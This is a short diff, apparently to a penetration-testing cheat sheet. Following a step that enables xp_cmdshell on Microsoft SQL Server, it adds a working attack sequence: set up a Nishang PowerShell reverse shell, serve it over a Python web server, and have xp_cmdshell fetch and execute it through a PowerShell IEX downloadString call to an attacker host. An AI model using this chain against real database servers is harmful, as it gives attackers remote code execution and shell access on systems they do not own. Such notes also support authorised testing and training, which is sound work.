@@ -3917,6 +3917,15 @@ go
 EXEC SP_CONFIGURE 'xp_cmdshell',1
 reconfigure
 go
+
+# sqsh - get proper reverse shell from xp_cmdshell
+## set up nishang
+Invoke-PowerShellTcp -Reverse -IPAddress IP_here -Port port_here
+## start web server
+sudo python -m SimpleHTTPServer 80
+## fetch rev shell via xp_cmdshell
+xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://attacker_IP_here/rev.ps1')"
+go
 ```
 
 
